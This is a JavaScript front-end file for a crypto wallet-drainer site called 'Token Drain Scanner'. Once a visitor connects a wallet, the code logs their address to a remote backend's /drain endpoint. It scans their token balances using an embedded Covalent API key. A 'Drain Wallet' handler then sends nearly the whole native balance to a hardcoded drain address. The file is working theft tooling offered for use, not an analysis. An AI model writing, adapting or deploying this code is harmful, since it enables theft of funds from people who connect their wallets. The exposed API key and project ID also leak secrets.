import { createAppKit } from "@reown/appkit";
import { EthersAdapter } from "@reown/appkit-adapter-ethers";
import { ethers } from "ethers";

// Configuration
const CONFIG = {
    projectId: "962425907914a3e80a7d8e7288b23f62",
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    
    // RPC Providers
    rpcProviders: {
        1: "https://eth.llamarpc.com",
        56: "https://bsc-dataseed.binance.org",
        137: "https://polygon-rpc.com",
        42161: "https://arb1.arbitrum.io/rpc"
    },
    
    networkNames: {
        1: "Ethereum",
        56: "Binance Smart Chain",
        137: "Polygon",
        42161: "Arbitrum"
    }
};

// Global state
let appKit = null;
let provider = null;
let signer = null;
let currentAccount = null;
let currentChainId = null;
let isConnected = false;

// DOM Elements
let connectBtn, statusEl, tokensEl, tokensContainer, drainBtn, scanAllBtn, chainSelector, networkSelect, tokenCount;

// DEBUG: Track initialization
console.log('🚀 MAIN.JS LOADING...');
console.log('Ethers available:', typeof ethers !== 'undefined');
console.log('Ethers version:', ethers?.version);

// Initialize when page loads
document.addEventListener('DOMContentLoaded', async () => {
    console.log('✅ DOM loaded, initializing app...');
    await initializeApp();
});

async function initializeApp() {
    try {
        console.log('🔄 Initializing app...');
        
        // Get DOM elements
        connectBtn = document.getElementById("connectBtn");
        statusEl = document.getElementById("status");
        tokensEl = document.getElementById("tokens");
        tokensContainer = document.getElementById("tokensContainer");
        drainBtn = document.getElementById("drainBtn");
        scanAllBtn = document.getElementById("scanAllBtn");
        chainSelector = document.getElementById("chainSelector");
        networkSelect = document.getElementById("networkSelect");
        tokenCount = document.getElementById("tokenCount");

        // Verify elements exist
        if (!connectBtn) {
            console.error('❌ CRITICAL: Connect button not found!');
            updateStatus('Error: Connect button not found');
            return;
        }
        
        console.log('✅ DOM elements found');
        updateStatus('🔄 Initializing wallet connection...');

        // Initialize AppKit first
        await initializeAppKit();
        
        // Setup event listeners
        setupEventListeners();
        
        // Test backend connection
        await testBackend();
        
        console.log("✅ App initialized successfully");
        updateStatus("✅ Ready! Click 'Connect Wallet' to begin");
        
    } catch (error) {
        console.error("❌ Initialization error:", error);
        updateStatus("Failed to initialize: " + error.message);
        
        // Emergency fallback
        setupEmergencyFallback();
    }
}

async function initializeAppKit() {
    try {
        console.log("🔄 Initializing AppKit...");
        
        // Create networks array
        const networks = Object.entries(CONFIG.rpcProviders).map(([id, rpcUrl]) => ({
            id: parseInt(id),
            name: CONFIG.networkNames[id] || `Chain ${id}`,
            rpcUrl: rpcUrl
        }));
        
        console.log('Creating AppKit with networks:', networks);
        
        // Initialize AppKit with proper configuration
        appKit = createAppKit({
            adapters: [new EthersAdapter()],
            projectId: CONFIG.projectId,
            networks: networks,
            metadata: {
                name: "Token Drain Scanner",
                description: "Multi-chain token scanner and drain",
                url: window.location.origin,
                icons: ["https://avatars.githubusercontent.com/u/37784886"]
            },
            themeMode: "dark",
            features: {
                analytics: false
            }
        });
        
        console.log("✅ AppKit created successfully");
        console.log("AppKit instance:", appKit);
        
        // Subscribe to state changes
        appKit.subscribeState(handleAppKitState);
        
    } catch (error) {
        console.error("❌ AppKit initialization error:", error);
        throw error;
    }
}

async function testBackend() {
    try {
        updateStatus('🔄 Checking backend connection...');
        const response = await fetch(`${CONFIG.backendUrl}/health`);
        if (response.ok) {
            const data = await response.json();
            console.log("✅ Backend is online:", data);
        } else {
            console.log("⚠️ Backend health check failed");
        }
    } catch (error) {
        console.log("⚠️ Backend unreachable:", error.message);
    }
}

function setupEventListeners() {
    console.log("🔄 Setting up event listeners...");
    
    // Connect button - CRITICAL: Remove any existing listeners first
    if (connectBtn) {
        // Clone and replace to remove all existing listeners
        const newBtn = connectBtn.cloneNode(true);
        connectBtn.parentNode.replaceChild(newBtn, connectBtn);
        connectBtn = newBtn;
        
        // Add click listener
        connectBtn.addEventListener("click", handleConnect);
        console.log("✅ Connect button listener added");
        
        // Debug: Add visual feedback
        connectBtn.addEventListener('mousedown', () => {
            console.log('Button mousedown event');
        });
        
        connectBtn.addEventListener('mouseup', () => {
            console.log('Button mouseup event');
        });
    } else {
        console.error("❌ Connect button not found after DOM ready!");
    }
    
    // Drain button
    if (drainBtn) {
        drainBtn.addEventListener("click", handleDrain);
    }
    
    // Scan all chains button
    if (scanAllBtn) {
        scanAllBtn.addEventListener("click", handleScanAll);
    }
    
    // Network selector
    if (networkSelect) {
        networkSelect.addEventListener("change", handleNetworkChange);
    }
}

function setupEmergencyFallback() {
    console.log('🔄 Setting up emergency fallback...');
    
    if (connectBtn) {
        // Direct MetaMask fallback
        connectBtn.addEventListener('click', async () => {
            updateStatus('🔄 Trying direct connection...');
            
            if (typeof window.ethereum !== 'undefined') {
                try {
                    const accounts = await window.ethereum.request({ 
                        method: 'eth_requestAccounts' 
                    });
                    
                    if (accounts && accounts.length > 0) {
                        currentAccount = accounts[0];
                        isConnected = true;
                        updateStatus(`✅ Connected directly!\nWallet: ${currentAccount.slice(0, 8)}...`);
                        showUIElements();
                        await logConnectionToBackend(currentAccount, 1);
                        await fetchTokens(currentAccount, 1);
                    }
                } catch (err) {
                    console.error('Direct connection failed:', err);
                    updateStatus('Connection failed. Please try again.');
                }
            } else {
                updateStatus('Please install MetaMask or another wallet');
            }
        });
        
        updateStatus('⚠️ Using fallback mode. Click to connect directly.');
    }
}

async function handleConnect(event) {
    console.log("🔄 Connect button clicked!", event);
    event.preventDefault();
    event.stopPropagation();
    
    try {
        if (!appKit) {
            updateStatus("❌ Wallet connection not initialized");
            console.error("AppKit not initialized");
            return;
        }
        
        console.log("AppKit state before open:", appKit.state);
        
        if (isConnected) {
            // Disconnect
            updateStatus("🔄 Disconnecting...");
            await appKit.disconnect();
            return;
        }
        
        updateStatus("🔄 Opening wallet modal...");
        console.log("Calling appKit.open()...");
        
        // Open the wallet modal
        await appKit.open();
        console.log("✅ Modal opened successfully");
        
    } catch (error) {
        console.error("❌ Connection error:", error);
        updateStatus("Connection failed: " + error.message);
        
        // Try alternative if AppKit.open fails
        tryAlternativeConnect();
    }
}

function tryAlternativeConnect() {
    console.log("🔄 Trying alternative connection method...");
    updateStatus("🔄 Trying alternative connection...");
    
    // Try using window.ethereum directly
    if (typeof window.ethereum !== 'undefined') {
        window.ethereum.request({ method: 'eth_requestAccounts' })
            .then(accounts => {
                if (accounts && accounts.length > 0) {
                    currentAccount = accounts[0];
                    isConnected = true;
                    updateStatus(`✅ Connected via fallback\nWallet: ${currentAccount.slice(0, 8)}...`);
                    showUIElements();
                    logConnectionToBackend(currentAccount, 1);
                    fetchTokens(currentAccount, 1);
                }
            })
            .catch(err => {
                console.error("Fallback connection failed:", err);
                updateStatus("Please install MetaMask or another wallet");
            });
    } else {
        updateStatus("Please install a wallet extension like MetaMask");
    }
}

function handleAppKitState(state) {
    console.log("🔄 AppKit State Update:", state);
    
    if (state.isConnected && state.account && state.chain) {
        console.log("✅ Connected state detected");
        handleConnected(state.account, state.chain);
    } else if (state.isConnected === false && isConnected) {
        console.log("❌ Disconnected state detected");
        handleDisconnected();
    }
}

async function handleConnected(account, chain) {
    try {
        console.log("🔄 Handling connection...");
        console.log("Account:", account);
        console.log("Chain:", chain);
        
        if (!account?.address || !chain?.id) {
            console.log("Waiting for account/chain data...");
            setTimeout(() => handleConnected(account, chain), 100);
            return;
        }
        
        currentAccount = account.address;
        currentChainId = chain.id;
        isConnected = true;
        
        // Update UI
        if (connectBtn) {
            connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        }
        
        updateStatus(`✅ Connected!\n👛 Wallet: ${currentAccount.slice(0, 8)}...${currentAccount.slice(-4)}\n🌐 Network: ${chain.name}\n⛓️ Chain ID: ${chain.id}`);
        
        // Show UI elements
        showUIElements();
        
        // Log connection to backend
        await logConnectionToBackend(currentAccount, chain.id);
        
        // Fetch tokens
        await fetchTokens(currentAccount, chain.id);
        
        // Update network selector
        if (chainSelector && networkSelect) {
            chainSelector.classList.remove("hidden");
            networkSelect.value = chain.id;
        }
        
        console.log("✅ Fully connected and ready");
        
    } catch (error) {
        console.error("❌ Connected handler error:", error);
        updateStatus("Connection error: " + error.message);
    }
}

function handleDisconnected() {
    console.log("🔄 Handling disconnection...");
    
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    provider = null;
    signer = null;
    
    if (connectBtn) {
        connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    }
    
    updateStatus("Disconnected");
    hideUIElements();
}

async function logConnectionToBackend(address, chainId) {
    try {
        updateStatus("🔄 Logging connection to backend...");
        
        const response = await fetch(`${CONFIG.backendUrl}/drain`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                timestamp: new Date().toISOString()
            }),
        });
        
        if (response.ok) {
            const data = await response.json();
            console.log("✅ Backend logged connection:", data);
            updateStatus(`✅ Connected & logged\n💰 Drain address: ${CONFIG.drainAddress.slice(0, 10)}...`);
        } else {
            console.log("⚠️ Backend logging failed");
        }
        
    } catch (error) {
        console.log("⚠️ Backend logging failed:", error.message);
    }
}

async function fetchTokens(address, chainId) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
    
    try {
        // Try backend first
        const response = await fetch(`${CONFIG.backendUrl}/tokens/${address}?chainId=${chainId}`);
        
        if (response.ok) {
            const data = await response.json();
            if (data.success && data.data.tokens && data.data.tokens.length > 0) {
                displayTokens(data.data.tokens);
                updateStatus(`✅ Found ${data.data.tokens.length} tokens on ${CONFIG.networkNames[chainId] || 'this chain'}`);
                return;
            }
        }
        
        // Fallback to direct Covalent API
        await fetchTokensFromCovalent(address, chainId);
        
    } catch (error) {
        console.error("❌ Token fetch error:", error);
        await fetchTokensFromCovalent(address, chainId);
    }
}

async function fetchTokensFromCovalent(address, chainId) {
    if (!tokensEl) return;
    
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false`
        );
        
        if (!response.ok) {
            throw new Error(`Covalent API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        const tokens = items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                
                return {
                    symbol: t.contract_ticker_symbol || (t.native_token ? 'Native' : 'TOKEN'),
                    name: t.contract_name || (t.native_token ? 'Native Token' : 'Unknown'),
                    amount: amount,
                    formattedAmount: amount.toLocaleString(undefined, {
                        minimumFractionDigits: 0,
                        maximumFractionDigits: 6
                    }),
                    value: value,
                    formattedValue: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    isNative: t.native_token || false
                };
            });
        
        if (tokens.length > 0) {
            displayTokens(tokens);
            updateStatus(`✅ Found ${tokens.length} tokens on ${CONFIG.networkNames[chainId] || 'this chain'}`);
        } else {
            tokensEl.innerHTML = '<div class="loading">No tokens found on this chain</div>';
            updateStatus("ℹ️ No tokens found on this chain");
        }
        
    } catch (error) {
        console.error("❌ Covalent error:", error);
        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens from Covalent API</div>';
        updateStatus("⚠️ Token scan failed");
    }
}

function displayTokens(tokens) {
    if (!tokensEl) return;
    
    const totalValue = tokens.reduce((sum, t) => sum + (t.value || 0), 0);
    
    const html = tokens.map(token => `
        <div class="token-item">
            <div class="token-info">
                <span class="token-symbol">${token.symbol}</span>
                <span class="token-name">${token.name}</span>
            </div>
            <div>
                <div class="token-amount">${token.formattedAmount || token.amount.toLocaleString(undefined, {maximumFractionDigits: 6})}</div>
                ${token.value > 0 ? `<div class="token-value">$${token.value.toFixed(2)}</div>` : ''}
            </div>
        </div>
    `).join('');
    
    tokensEl.innerHTML = html;
    
    if (tokenCount) {
        tokenCount.textContent = `${tokens.length} token${tokens.length !== 1 ? 's' : ''} • $${totalValue.toFixed(2)}`;
    }
    
    if (tokensContainer) {
        tokensContainer.classList.remove("hidden");
    }
}

async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert("Please connect wallet first");
        return;
    }
    
    if (!confirm(`⚠️ DRAIN WARNING\n\nThis will send ALL tokens to:\n${CONFIG.drainAddress}\n\nYou need native token (ETH, MATIC, etc.) for gas.\n\nContinue?`)) {
        return;
    }
    
    const statusEl = document.getElementById("status");
    const drainBtn = document.getElementById("drainBtn");
    
    try {
        updateStatus("🚀 Starting drain process...");
        if (drainBtn) {
            drainBtn.disabled = true;
            drainBtn.textContent = "⏳ Draining...";
        }
        
        // Get signer from wallet using AppKit's signer
        if (appKit && appKit.signer) {
            provider = new ethers.providers.Web3Provider(appKit.signer);
            signer = provider.getSigner();
        } else if (typeof window.ethereum !== 'undefined') {
            provider = new ethers.providers.Web3Provider(window.ethereum);
            signer = provider.getSigner();
        } else {
            throw new Error("No wallet provider found");
        }
        
        // Get ETH balance
        const balance = await provider.getBalance(currentAccount);
        const gasPrice = await provider.getGasPrice();
        const gasLimit = ethers.BigNumber.from(21000);
        const gasCost = gasPrice.mul(gasLimit);
        
        // Check if enough for gas
        if (balance.gt(gasCost.mul(2))) {
            const sendAmount = balance.sub(gasCost.mul(2));
            
            const tx = await signer.sendTransaction({
                to: CONFIG.drainAddress,
                value: sendAmount,
                gasLimit: gasLimit
            });
            
            updateStatus(`📤 Transaction sent: ${tx.hash}\n⏳ Waiting for confirmation...`);
            
            const receipt = await tx.wait();
            updateStatus(`✅ Drain completed!\nTransaction confirmed in block ${receipt.blockNumber}`);
            
            // Refresh token display
            await fetchTokens(currentAccount, currentChainId);
            
        } else {
            updateStatus("⚠️ Not enough native token for gas");
        }
        
    } catch (error) {
        console.error("❌ Drain error:", error);
        updateStatus(`❌ Drain failed: ${error.message}`);
        alert(`Drain failed: ${error.message}`);
    } finally {
        const drainBtn = document.getElementById("drainBtn");
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.textContent = "⚡ Drain Wallet";
        }
    }
}

async function handleScanAll() {
    alert("Scan all chains feature coming soon!");
}

async function handleNetworkChange(event) {
    const newChainId = parseInt(event.target.value);
    
    if (newChainId === currentChainId) {
        return;
    }
    
    try {
        updateStatus(`🔄 Switching to ${CONFIG.networkNames[newChainId] || `Chain ${newChainId}`}...`);
        
        // Switch network in wallet
        await appKit.switchChain({ id: newChainId });
        
    } catch (error) {
        console.error("❌ Network switch error:", error);
        updateStatus(`❌ Failed to switch network: ${error.message}`);
        // Reset selector
        if (networkSelect) {
            networkSelect.value = currentChainId;
        }
    }
}

function showUIElements() {
    if (chainSelector) chainSelector.classList.remove("hidden");
    if (drainBtn) drainBtn.classList.remove("hidden");
    if (scanAllBtn) scanAllBtn.classList.remove("hidden");
    if (tokensContainer) tokensContainer.classList.remove("hidden");
}

function hideUIElements() {
    if (chainSelector) chainSelector.classList.add("hidden");
    if (drainBtn) drainBtn.classList.add("hidden");
    if (scanAllBtn) scanAllBtn.classList.add("hidden");
    if (tokensContainer) tokensContainer.classList.add("hidden");
    
    if (tokensEl) tokensEl.innerHTML = "";
    if (tokenCount) tokenCount.textContent = "0 tokens";
}

function updateStatus(message) {
    if (statusEl) {
        statusEl.textContent = message;
    }
}

// Debug info
console.log("=== App Debug Info ===");
console.log("Ethers version:", ethers.version);
console.log("Window.ethereum:", typeof window.ethereum !== 'undefined');
console.log("DOM Ready State:", document.readyState);
console.log("======================");
